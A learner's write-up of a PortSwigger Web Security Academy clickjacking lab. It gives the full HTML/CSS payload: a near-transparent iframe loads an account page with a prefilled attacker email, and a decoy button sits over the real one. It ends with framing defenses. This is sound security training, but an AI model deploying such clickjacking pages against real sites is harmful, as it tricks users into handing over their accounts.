# PortSwigger Web Security Academy: Clickjacking Lab 2

## Lab Name
Clickjacking with form input data prefilled from a URL parameter

## How I Solved 

1. **Identified the Parameter:** Noticed that the "Update email" input field can be populated using the `?email=` URL parameter.
2. **Crafted Payload:** Used the Exploit Server to host an HTML page with an `iframe` pointing to the target's `/my-account` page with a prefilled malicious email.
3. **UI Redressing (Alignment):** 
   * Added a decoy `<div>Click me</div>` element.
   * Adjusted CSS absolute positioning to align the fake button directly over the hidden "Update email" button.
4. **Made Transparent:** Set the iframe `opacity` to `0.0001` to hide the victim's profile page completely.
5. Final Code Used:
```html
<style>
    iframe {
        position: relative;
        width: 900px;
        height: 700px;
        opacity: 0.0001;
        z-index: 2;
    }
    div {
        position: absolute;
        top: 450px; 
        left: 80px;
        z-index: 1;
    }
</style>
<div>Click me</div>
<iframe src="https://0a870015041e90c080cc353c006b004f.web-security-academy.net/my-account?email=hacker@attacker-website.com"></iframe>


```
6. **Executed Attack:** Delivered the exploit to the victim, forcing them to click the hidden "Update email" button and hijacking their email.

## What I Learned 

* **Parameter Pre-filling:** Many applications allow filling form input fields (like email boxes) directly via URL parameters (e.g., `?email=test@test.com`).
* **Exploitation:** An attacker can combine this feature with Clickjacking. By loading the pre-filled URL inside a hidden iframe, they can force the victim to submit modified data with a single click.
* **Defense:** Always enforce strict `X-Frame-Options` or `Content-Security-Policy (CSP) frame-ancestors` to prevent framing, even on input forms.




